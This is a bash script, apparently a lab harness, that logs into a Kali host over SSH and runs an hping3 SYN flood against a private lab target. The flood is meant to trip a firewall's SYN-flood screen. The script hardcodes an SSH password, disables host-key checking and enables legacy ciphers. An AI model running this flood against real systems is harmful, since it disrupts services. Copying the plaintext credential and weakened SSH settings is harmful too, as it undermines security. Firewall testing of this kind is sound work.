#!/bin/bash
# SYN Flood attack from Kali → Linux target (192.168.20.2)
# Triggers: TCP SYN flood screen (attack threshold: 200 SYNs/sec)

SSH_OPTS="-o StrictHostKeyChecking=no -oKexAlgorithms=+diffie-hellman-group14-sha1,diffie-hellman-group1-sha1 -oHostKeyAlgorithms=+ssh-rsa -oCiphers=+aes256-cbc,aes128-cbc"
KALI="100.123.38.1"
TARGET="192.168.20.2"
DURATION=${1:-10}

echo "=== SYN Flood Attack ==="
echo "Attacker : Kali (192.168.10.2)"
echo "Target   : Linux (${TARGET}:80)"
echo "Duration : ${DURATION}s"
echo "Triggers : TCP SYN flood SCREEN (threshold: 200/sec)"
echo ""
echo "Starting attack..."

sshpass -p 'Juniper!1' ssh $SSH_OPTS jcluser@$KALI \
    "timeout ${DURATION} sudo /usr/sbin/hping3 -S --flood -V -p 80 ${TARGET} 2>&1 | tail -5" 2>/dev/null

echo ""
echo "Attack complete. Check monitor.sh for SCREEN hit counters."
